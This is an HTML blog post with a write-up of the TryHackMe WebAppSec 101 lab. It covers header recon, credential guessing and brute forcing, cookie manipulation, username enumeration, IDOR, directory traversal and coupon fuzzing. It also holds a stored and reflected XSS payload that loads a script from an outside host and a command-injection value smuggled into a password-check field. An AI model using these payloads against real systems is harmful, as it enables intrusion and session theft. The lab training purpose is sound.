@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>TryHackMe WebAppSec 101 Write-Up :: Mark Ramige: Appsec and Bug Bounties</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This TryHackMe room contains a web application with multiple vulnerabilities. The tasks step us through different types of vulnerabilities with links to authoritative resources to learn more about each type. There is a good combination of hand-holding and do-it-yourself. The vulnerabilities include weak credentials, cross-site scripting (xss), command and sql injection, idor, directory traversal, and logic flaws.
+Contents  Task 2 - Walking through the application Task 4 - Authentication Task 5 - Cross Site Scripting (XSS) Task 6 - Injection Task 7 - Miscellaneous &amp;amp; Logic Flaws  Task 2 - Walking through the application We can proxy the traffic through Burp Suite to view all of the response headers." />
+<meta name="keywords" content="weak credentials, idor, sql injection, logic flaws, directory traversal" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://markramige.com/posts/tryhackme-webappsec-101-write-up/" />
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-178664934-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+<link rel="stylesheet" href="https://markramige.com/assets/style.css">
+
+  <link rel="stylesheet" href="https://markramige.com/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://markramige.com/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://markramige.com/favicon.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="markramige" />
+  
+    <meta name="twitter:creator" content="markramige" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="TryHackMe WebAppSec 101 Write-Up">
+<meta property="og:description" content="[This TryHackMe room](https://tryhackme.com/room/webappsec101) contains a web application with multiple vulnerabilities. The tasks step us through different types of vulnerabilities with links to authoritative resources to learn more about each type. There is a good combination of hand-holding and do-it-yourself. The vulnerabilities include weak credentials, cross-site scripting (xss), command and sql injection, idor, directory traversal, and logic flaws." />
+<meta property="og:url" content="https://markramige.com/posts/tryhackme-webappsec-101-write-up/" />
+<meta property="og:site_name" content="Mark Ramige: Appsec and Bug Bounties" />
+
+  <meta property="og:image" content="https://markramige.com/">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-03-22 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="blue">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    &gt;_ Mark Ramige
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://github.com/markramige">GitHub</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/markramige">Twitter</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://github.com/markramige">GitHub</a></li>
+      
+    
+      
+        <li><a href="https://twitter.com/markramige">Twitter</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://markramige.com/posts/tryhackme-webappsec-101-write-up/">TryHackMe WebAppSec 101 Write-Up</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-03-22 
+      </span>
+    
+    
+    <span class="post-author">:: Mark Ramige</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://markramige.com/tags/weak-credentials/">weak credentials</a>&nbsp;
+    
+    #<a href="https://markramige.com/tags/idor/">idor</a>&nbsp;
+    
+    #<a href="https://markramige.com/tags/sql-injection/">sql injection</a>&nbsp;
+    
+    #<a href="https://markramige.com/tags/logic-flaws/">logic flaws</a>&nbsp;
+    
+    #<a href="https://markramige.com/tags/directory-traversal/">directory traversal</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <p><a href="https://tryhackme.com/room/webappsec101">This TryHackMe room</a> contains a web application with multiple vulnerabilities. The tasks step us through different types of vulnerabilities with links to authoritative resources to learn more about each type. There is a good combination of hand-holding and do-it-yourself. The vulnerabilities include weak credentials, cross-site scripting (xss), command and sql injection, idor, directory traversal, and logic flaws.</p>
+<h2 id="contents">Contents<a href="#contents" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li><a href="#task-2---walking-through-the-application">Task 2 - Walking through the application</a></li>
+<li><a href="#task-4---authentication">Task 4 - Authentication</a></li>
+<li><a href="#task-5---cross-site-scripting-xss">Task 5 - Cross Site Scripting (XSS)</a></li>
+<li><a href="#task-6---injection">Task 6 - Injection</a></li>
+<li><a href="#task-7---miscellaneous--logic-flaws">Task 7 - Miscellaneous &amp; Logic Flaws</a></li>
+</ul>
+<h2 id="task-2---walking-through-the-application">Task 2 - Walking through the application<a href="#task-2---walking-through-the-application" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>We can proxy the traffic through Burp Suite to view all of the response headers. For this web application, it sends a <code>Server</code> and <code>X-Powered-By</code> header with every response.</p>
+<p>For the server specifically, we can also force it to produce a 404 error by visiting <code>http://MACHINE_IP/asdf</code> (or any other nonexisting page) and the server name and version is given on the 404 error page. We could also run <code>nmap -A -T4 MACHINE_IP</code> to get the server name and version.</p>
+<ul>
+<li>What version of Apache is being used?</li>
+</ul>
+<p>Check the <code>Server</code> response header in Burp Suite.</p>
+<ul>
+<li>What language was used to create the website?</li>
+</ul>
+<p>Check the <code>X-Powered-By</code> reponse header.</p>
+<ul>
+<li>What version of the language is used?</li>
+</ul>
+<p>Check the <code>X-Powered-By</code> reponse header.</p>
+<h2 id="task-4---authentication">Task 4 - Authentication<a href="#task-4---authentication" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>What is the admin username?</li>
+</ul>
+<p>There&rsquo;s a link to the admin area at the bottom of each page. Click on the link and try to guess the user name.</p>
+<ul>
+<li>What is the admin password?</li>
+</ul>
+<p>Try to guess the password using common passwords.</p>
+<p>An alternative to guessing (if this challenge was more difficult) would be to use Burp Suite Intruder to brute force the password using a word list.</p>
+<ul>
+<li>What is the name of the cookie that can be manipulated?</li>
+</ul>
+<p>A cookie is set when logging into the admin page. The value is a single digit that can be easily manipulated to steal a session.</p>
+<ul>
+<li>What is the username of a logged on user?</li>
+</ul>
+<p>For this we want to brute force the user creation page (<code>http://MACHINE_IP/users/register.php</code>) since it will tell us when an account already exists.</p>
+<p>We can use <a href="https://owasp.org/www-project-zap/">OWASP ZAP</a> to fuzz the user names since the Burp Suite Community Edition is slow at brute forcing.</p>
+<p>We&rsquo;re going to use the <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt">SecLists</a> user name list.</p>
+<p>We&rsquo;re registering an account with each user name that gets submitted, so what we&rsquo;re looking for in the output is the name that can&rsquo;t be registered because it already exists.</p>
+<ul>
+<li>What is the corresponding password to the username?</li>
+</ul>
+<p>Try guessing first based on what you know about the user name and user. If you can&rsquo;t guess the password, try brute forcing it with a <a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">word list</a></p>
+<h2 id="task-5---cross-site-scripting-xss">Task 5 - Cross Site Scripting (XSS)<a href="#task-5---cross-site-scripting-xss" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Use the first payload on the linked page to test for XSS.</p>
+<p><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;</code></p>
+<ul>
+<li>Test for XSS on the search bar</li>
+</ul>
+<p>This input is vulnerable to reflected XSS.</p>
+<ul>
+<li>Test for XSS on the guestbook page</li>
+</ul>
+<p>This input is vulnerable to stored XSS.</p>
+<h2 id="task-6---injection">Task 6 - Injection<a href="#task-6---injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>Perform command injection on the check password field</li>
+</ul>
+<p>If we test the field, we get back <code>The command &quot;grep ^test$ /etc/dictionaries-common/words&quot; was used to check if the password was in the dictionary.</code> which is very handy!</p>
+<p>We just need to end the grep command and insert our own command after it.</p>
+<p><code>'';ls;</code> should work for any command that we have permissions to run. This will hang the application.</p>
+<ul>
+<li>Check for SQLi on the application</li>
+</ul>
+<p>The login form (http://MACHINE_IP/users/login.php) is vulnerable to SQLi. Try testing <a href="https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b">payloads</a> to see what is possible.</p>
+<h2 id="task-7---miscellaneous--logic-flaws">Task 7 - Miscellaneous &amp; Logic Flaws<a href="#task-7---miscellaneous--logic-flaws" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>Find a parameter manipulation vulnerability</li>
+</ul>
+<p>The sample page linked from the home page at <code>http://MACHINE_IP/users/sample.php?userid=1</code> contains the <code>userid</code> parameter that we can easily change to view additional photos.</p>
+<ul>
+<li>Find a directory traversal vulnerability</li>
+</ul>
+<p>The file name field on the picture upload page (<code>http://MACHINE_IP/pictures/upload.php</code>) allows us to exploit directory traversal.</p>
+<ul>
+<li>Find a forceful browsing vulnerability</li>
+</ul>
+<p>We can visit <code>http://MACHINE_IP/upload/</code> and view all images that have been uploaded by all users.</p>
+<ul>
+<li>Logic flaw: try to get an item for free</li>
+</ul>
+<p>We can fuzz the coupon code field on the cart review page (<code>http://MACHINE_IP/cart/review.php</code>). Unsuccessful attempts give us a 303 status code.</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://markramige.com/posts/tryhackme-windows-privesc-arena-write-up/">
+                <span class="button__icon">←</span>
+                <span class="button__text">TryHackMe Windows PrivEsc Arena Write-Up</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://markramige.com/posts/tryhackme-hackernote-write-up/">
+                <span class="button__text">TryHackMe Hackernote Write-Up</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© 2020 <a href='https://github.com/markramige/markramigecom'>Mark Ramige</a> :: <a href='https://creativecommons.org/licenses/by/4.0/?ref=chooser-v1'>CC BY 4.0</a> Licensed :: Powered by <a href='http://gohugo.io'>Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://markramige.com/assets/main.js"></script>
+<script src="https://markramige.com/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
